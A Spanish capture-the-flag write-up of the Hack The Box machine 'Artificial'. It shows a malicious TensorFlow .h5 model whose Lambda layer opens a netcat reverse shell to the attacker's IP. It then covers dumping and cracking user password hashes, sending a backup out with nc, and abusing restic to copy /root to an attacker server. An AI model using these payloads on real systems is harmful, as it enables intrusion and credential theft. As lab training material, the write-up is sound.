
# Artificial

<figure><img src="/files/XDBO7Q8WyTEC56ytkwbL" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Artificial`
* **IP:** `10.10.11.74`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `02-02-2025`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.74 artificial.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

```bash
sudo nmap -v -sV -T5 10.10.11.74
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

### Acceso Web

Accedemos a `http://artificial.htb` y observamos que parece ser una plataforma de inteligencia artificial:

<figure><img src="/files/pJXnQNHQLF1L4DTdonz5" alt=""><figcaption></figcaption></figure>

#### Registro de usuario

Nos registramos y al acceder por el login web, vemos que podemos subir archivos, concretamente un modelo de inteligencia artificial.

<figure><img src="/files/vyBLQeHRRMsIrnB3bneJ" alt=""><figcaption></figcaption></figure>

Nos descargamos los `requirements` y el `Dockerfile` de muestra que nos da la plataforma, vamos a echarles un ojo:

```bash
cat requirements.txt 

tensorflow-cpu==2.13.1
```

```bash
cat Dockerfile

FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

#### Montar Dockerbuild

```bash
docker build -t app .

[+] Building 0.8s (8/8) FINISHED                                                                                                                        docker:default
 => [internal] load build definition from Dockerfile                                                                                                              0.0s
 => => transferring dockerfile: 496B                                                                                                                              0.0s
 => [internal] load metadata for docker.io/library/python:3.8-slim                                                                                                0.7s
 => [internal] load .dockerignore                                                                                                                                 0.0s
 => => transferring context: 2B                                                                                                                                   0.0s
 => [1/4] FROM docker.io/library/python:3.8-slim@sha256:1d52838af602b4b5a831beb13a0e4d073280665ea7be7f69ce2382f29c5a613f                                          0.0s
 => CACHED [2/4] WORKDIR /code                                                                                                                                    0.0s
 => CACHED [3/4] RUN apt-get update &&     apt-get install -y curl &&     curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a  0.0s
 => CACHED [4/4] RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl                                                 0.0s
 => exporting to image                                                                                                                                            0.0s
 => => exporting layers                                                                                                                                           0.0s
 => => writing image sha256:3a7376c6a232201423e2bcf3f52fef37b0749539c520a59d809fb8ce3637fa74                                                                      0.0s
 => => naming to docker.io/library/app 
```

***

## <mark style="color:purple;">Explotación de RCE en TensorFlow</mark>

La plataforma parece que solo admite el formato .h5, por lo que tendremos que crear un payload en ese formato.

El vector se basa en **crear un archivo `.h5` malicioso** que contenga una referencia a una función manipulada mediante una capa personalizada (custom layer) que se ejecuta al cargar el modelo. Esto **puede generar RCE (Remote Code Execution)** si el entorno no está debidamente aislado.

Encontramos el siguiente artículo interesante para explotar un RCE en TensorFlow:

{% embed url="<https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model#getting-the-rce>" %}

### Generador de modelo malicioso

{% code title="exploit-gen.py" %}

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.211 6666 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

{% endcode %}

### Instalar TensorFlow en Kali

Para poder ejecutar el script anterior y que nos genere el modelo `infected.h5` necesitamos instalar `TensorFlow` en Kali Linux:

{% embed url="<https://www.tensorflow.org/install/docker?hl=es-419>" %}

```bash
docker pull tensorflow/tensorflow

Using default tag: latest
latest: Pulling from tensorflow/tensorflow
9cb31e2e37ea: Pull complete 
b206aecd8f37: Pull complete 
6290e5bec62a: Pull complete 
f0ed8add4d64: Pull complete 
849afc018f37: Pull complete 
c1f5d2749600: Pull complete 
80cd4fb31fd2: Pull complete 
3dec9576b0a7: Pull complete 
f08dfcd086f7: Pull complete 
eccb81a51b2a: Pull complete 
e065104e565d: Pull complete 
6418d90b0649: Pull complete 
Digest: sha256:f24e8494d43a4e613edd7fbd3782594368d52d79af1e216051139ed2d7830682
Status: Downloaded newer image for tensorflow/tensorflow:latest
docker.io/tensorflow/tensorflow:latest
```

### Ejecutar el script

```bash
docker run -it --rm -v "$PWD":/code -w /code tensorflow/tensorflow python3 exploit-gen.py

2025-07-01 18:53:19.219837: I tensorflow/core/util/port.cc:153] oneDNN custom operations are on. You may see slightly different numerical results due to floating-point round-off errors from different computation orders. To turn them off, set the environment variable `TF_ENABLE_ONEDNN_OPTS=0`.
2025-07-01 18:53:19.323378: I tensorflow/core/platform/cpu_feature_guard.cc:210] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2 AVX512F AVX512_VNNI AVX512_BF16 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
2025-07-01 18:53:21.973668: I tensorflow/core/util/port.cc:153] oneDNN custom operations are on. You may see slightly different numerical results due to floating-point round-off errors from different computation orders. To turn them off, set the environment variable `TF_ENABLE_ONEDNN_OPTS=0`.
sh: 1: nc: not found
WARNING:absl:You are saving your model as an HDF5 file via `model.save()` or `keras.saving.save_model(model)`. This file format is considered legacy. We recommend using instead the native Keras format, e.g. `model.save('my_model.keras')` or `keras.saving.save_model(model, 'my_model.keras')`. 
```

Eso nos habrá generado el archivo `exploit.h5` en el directorio actual.

### Abrimos listener de Netcat

```bash
nc -lvnp 6666

listening on [any] 6666 ...
```

### Subir el .h5 malicioso

Al subir el archivo .h5 malicioso vemos que le cambia de nombre a uno random:

<figure><img src="/files/g1cxXVnszXRtR3LmMGTl" alt=""><figcaption></figcaption></figure>

Al darle click a `View Predictions` recibimos una reverse shell:

```bash
nc -lvnp 6666

listening on [any] 6666 ...
connect to [10.10.14.211] from (UNKNOWN) [10.10.11.74] 33338
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(app) gid=1001(app) groups=1001(app)
$
```

***

## <mark style="color:purple;">Enumeración interna</mark>

Tras enumerar el objetivo encontramos un archivo `users.db` que podemos abrir con `sqlite3` para extraer todos los hashes de los usuarios del sistema:

```shell-session
app@artificial:~/app/instance$ sqlite3 users.db 

Enter ".help" for usage hints.
sqlite> select * from user;
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|notthei0204|notthei0204@gmail.com|f0f1f60430a59e920764a7b1be6041fc
7|test123@gmail.com|test123@gmail.com|9a93efa79aa9f5d35e14bc55a3e16dc4
8|n|n@n.com|7b8b965ad4bca0e41ab51de7b31363a1
9|test|test@email.com|098f6bcd4621d373cade4e832627b4f6
10|dd|dd@gmail.com|827ccb0eea8a706c4c34a16891f84e7b
11|ddd|ddd@gmail.com|77963b7a931377ad4ab5ad6a9cd718aa
```

### Cracking de hashes

Guardamos los hashes MD5 con el siguiente formato para quer John pueda crackearlos:

```
gael:c99175974b6e192936d97224638a34f8
mark:0f3d8c76530022670f1c6029eed09ccb
robert:b606c5f5136170f15444251665638b36
royer:bc25b1f80f544c0ab451c02a3dca9fc6
mary:bf041041e57f1aff3be7ea1abd6129d0
notthei0204:f0f1f60430a59e920764a7b1be6041fc
test123:9a93efa79aa9f5d35e14bc55a3e16dc4
n:7b8b965ad4bca0e41ab51de7b31363a1
test:098f6bcd4621d373cade4e832627b4f6
dd:827ccb0eea8a706c4c34a16891f84e7b
ddd:77963b7a931377ad4ab5ad6a9cd718aa
```

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-md5

Using default input encoding: UTF-8
Loaded 11 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost any other key for status
12345            (dd)     
test             (test)     
n                (?)     
ddd              (ddd)     
mattp005numbertwo (gael)     
marwinnarak043414036 (royer)
```

Conseguimos la contraseña de 2 usuarios interesantes:

```
mattp005numbertwo (gael)     
marwinnarak043414036 (royer)
```

***

## <mark style="color:purple;">Acceso SSH</mark>

Al acceder con el usuario gael conseguimos la user flag:

```bash
ssh gael@artificial.htb
                                                 
The authenticity of host 'artificial.htb (10.10.11.74)' can't be established.
ED25519 key fingerprint is SHA256:RfqGfdDw0WXbAPIqwri7LU4OspmhEFYPijXhBj6ceHs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'artificial.htb' (ED25519) to the list of known hosts.
gael@artificial.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

gael@artificial:~$ ls
user.txt

gael@artificial:~$ cat user.txt
29cf0fba3c5d4bb974260a21***********
```

***

## <mark style="color:purple;">Escalada de privilegios</mark>

Encontramos un directorio `/var/backups` que podría contener credenciales:

```shell-session
gael@artificial:/var/backups$ ls -la
total 51228
drwxr-xr-x  2 root root       4096 Jul  1 18:57 .
drwxr-xr-x 13 root root       4096 Jun  2 07:38 ..
-rw-r--r--  1 root root      38602 Jun  9 10:48 apt.extended_states.0
-rw-r--r--  1 root root       4253 Jun  9 09:02 apt.extended_states.1.gz
-rw-r--r--  1 root root       4206 Jun  2 07:42 apt.extended_states.2.gz
-rw-r--r--  1 root root       4190 May 27 13:07 apt.extended_states.3.gz
-rw-r--r--  1 root root       4383 Oct 27  2024 apt.extended_states.4.gz
-rw-r--r--  1 root root       4379 Oct 19  2024 apt.extended_states.5.gz
-rw-r--r--  1 root root       4367 Oct 14  2024 apt.extended_states.6.gz
-rw-r-----  1 root sysadm 52357120 Mar  4 22:19 backrest_backup.tar.gz

gael@artificial:/var/backups$ id
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
```

### Envío del backup a Kali

{% code title="En Kali" %}

```bash
nc -nlvp 4444 > backrest_backup.tar.gz
```

{% endcode %}

{% code title="En la máquina" %}

```bash
nc 10.10.14.211 4444 < backrest_backup.tar.gz
```

{% endcode %}

### Descomprimimos el archivo tar

```bash
tar -xvf backrest_backup.tar.gz

backrest/
backrest/restic
backrest/oplog.sqlite-wal
backrest/oplog.sqlite-shm
backrest/.config/
backrest/.config/backrest/
backrest/.config/backrest/config.json
backrest/oplog.sqlite.lock
backrest/backrest
```

### Extracción de contraseñas

```bash
pwd           
/home/kali/Escritorio/machines/htb/artificial/backrest/.config/backrest

cat config.json 

{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

Encontramos una contraseña en formato`bcrypt`, pero es necesario decodificarlo en `base64` para poder crackearlo:

```shell
cat hash.txt | base64 -d

$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```

Editamos el archivo hash.txt con esa cadena de texto y lo crackeamos con john:

```bash
cat hash.txt 

$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^           (?)
```

Tenemos la contraseña, pero no sabemos que podemos hacer con ella, ya que no hay más usuarios en el sistema y al probar a cambiar a root nos da error:

```shell-session
gael@artificial:~$ su root
Password: !@#$%^
su: Authentication failure
```

***

### Servicios internos expuestos

```shell-session
gael@artificial:~$ ss -tuln

Netid  State   Recv-Q  Send-Q    Local Address:Port     Peer Address:Port  Process  
udp    UNCONN  0       0         127.0.0.53%lo:53            0.0.0.0:*              
tcp    LISTEN  0       4096      127.0.0.53%lo:53            0.0.0.0:*              
tcp    LISTEN  0       128             0.0.0.0:22            0.0.0.0:*              
tcp    LISTEN  0       2048          127.0.0.1:5000          0.0.0.0:*              
tcp    LISTEN  0       4096          127.0.0.1:9898          0.0.0.0:*              
tcp    LISTEN  0       511             0.0.0.0:80            0.0.0.0:*              
tcp    LISTEN  0       128                [::]:22               [::]:*              
tcp    LISTEN  0       511                [::]:80               [::]:* 
```

Observamos varios servicios expuestos, entre ellos uno interesante el 9898, por lo que haremos un port forwarding para acceder desde Kali al servicio interno.

#### Port Forwarding SSH

```bash
ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898
```

Accedemos por el navegador a <http://localhost:9898/> y accedemos a un panel de login:

<figure><img src="/files/7ehsw9zw10NCyowBeShb" alt=""><figcaption></figcaption></figure>

En el archivo `config.json` nos indicaba que el usuario es `backrest_root`, por lo que al probarlo con la contraseña crackeada accedemos sin problema.

Aquí podemos crear un repositorio y luego ejecutar comandos desde el:

<figure><img src="/files/3miTkDIiitHsytsyTCkO" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/K5ykkUfC6NRMkRojH6R2" alt=""><figcaption></figcaption></figure>

Con el comando help encontramos todos los comandos que podemos ejecutar:

<figure><img src="/files/FE89vA7Xzqg0kgUOx29x" alt=""><figcaption></figcaption></figure>

Solo podemos ejecutar `restic`, por lo que al buscar en GTFOBin encontramos información relevante para escalar privilegios:

{% embed url="<https://gtfobins.github.io/gtfobins/restic/>" %}

Primero, debemos instalar restic en Kali y crear un repositorio:

```bash
sudo apt install restic -y
sudo mkdir -p /tmp/restic-data/repo2          
sudo chown -R $USER:$USER /tmp/restic-data/repo2
```

Debemos iniciar el rest server en Kali y iniciar el servicio en la máquina objetivo:

{% embed url="<https://github.com/restic/rest-server/>" %}

```bash
git clone https://github.com/restic/rest-server.git 
cd rest-server

go build -o rest-server ./cmd/rest-server
./rest-server --path /tmp/restic-data --listen :12345 --no-auth

go: downloading github.com/spf13/cobra v1.9.1
go: downloading github.com/coreos/go-systemd/v22 v22.5.0
go: downloading github.com/gorilla/handlers v1.5.2
go: downloading github.com/prometheus/client_golang v1.22.0
go: downloading golang.org/x/crypto v0.38.0
go: downloading github.com/minio/sha256-simd v1.0.1
go: downloading github.com/miolini/datacounter v1.0.3
go: downloading github.com/felixge/httpsnoop v1.0.4
go: downloading github.com/klauspost/cpuid/v2 v2.2.9
go: downloading github.com/spf13/pflag v1.0.6
go: downloading google.golang.org/protobuf v1.36.5
go: downloading github.com/prometheus/client_model v0.6.1
go: downloading github.com/beorn7/perks v1.0.1
go: downloading github.com/cespare/xxhash/v2 v2.3.0
go: downloading github.com/prometheus/common v0.62.0
go: downloading github.com/prometheus/procfs v0.15.1
go: downloading github.com/munnerz/goautoneg v0.0.0-20191010083416-a7dc8b61c822
go: downloading golang.org/x/sys v0.33.0
Data directory: /tmp/restic-data
Authentication disabled
Append only mode disabled
Private repositories disabled
Group accessible repos disabled
start server on [::]:12345
```

Ahora ejecutamos en el objetivo:

{% hint style="warning" %}
**IMPORTANTE**: No iniciar el repo desde Kali, sino desde el objetivo para que genere los archivos de configuración correctamente
{% endhint %}

```bash
# Iniciar repositorio local desde el objetivo
-r rest:http://10.10.14.211:12345/repo2 init

# Backup del directorio /root a Kali
-r rest:http://10.10.14.211:12345/repo2 backup /root
```

<figure><img src="/files/ufEKNN1Hqtpvlm10pzKs" alt=""><figcaption></figcaption></figure>

### Ver Snapshots en Kali

Encontramos un Snapshot:

```shell-session
afsh4ck@kali$ restic -r /tmp/restic-data/repo2 snapshots

enter password for repository: 
repository 96ed7433 opened (version 2, compression level auto)
ID        Time                 Host        Tags        Paths  Size
-----------------------------------------------------------------------
19d9f9fd  2025-07-02 21:43:35  artificial              /root  4.299 MiB
-----------------------------------------------------------------------
1 snapshots
```

#### Restaurar Snapshot

```shell-session
afsh4ck@kali$ restic -r /tmp/restic-data/repo2 restore 19d9f9fd --target /tmp/restic-data/repo2/restore

enter password for repository: 
repository 96ed7433 opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
restoring snapshot 19d9f9fd of [/root] at 2025-07-02 19:43:35.177979609 +0000 UTC by root@artificial to ./restore
Summary: Restored 80 files/dirs (4.299 MiB) in 0:00
```

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```shell-session
afsh4ck@kali$ pwd
/tmp/restic-data/repo2

afsh4ck@kali$ ls -la
drwxr-xr-x kali kali 180 B  Wed Jul  2 21:51:23 2025  .
drwxr-xr-x root root  80 B  Wed Jul  2 21:41:29 2025  ..
.rw------- kali kali 155 B  Wed Jul  2 21:43:27 2025  config
drwx------ kali kali 5.0 KB Wed Jul  2 21:43:25 2025  data
drwx------ kali kali  60 B  Wed Jul  2 21:43:41 2025  index
drwx------ kali kali  60 B  Wed Jul  2 21:43:27 2025  keys
drwx------ kali kali  40 B  Wed Jul  2 21:51:23 2025  locks
drwx------ kali kali  60 B  Wed Jul  2 21:51:23 2025  restore
drwx------ kali kali  60 B  Wed Jul  2 21:43:41 2025  snapshots

afsh4ck@kali$ cd restore               

afsh4ck@kali$ ls    
root

afsh4ck@kali$ cd root   

afsh4ck@kali$ ls
root.txt  scripts

afsh4ck@kali$ cat root.txt 
cd4d50c27c50f8f928a6fc9**********
```
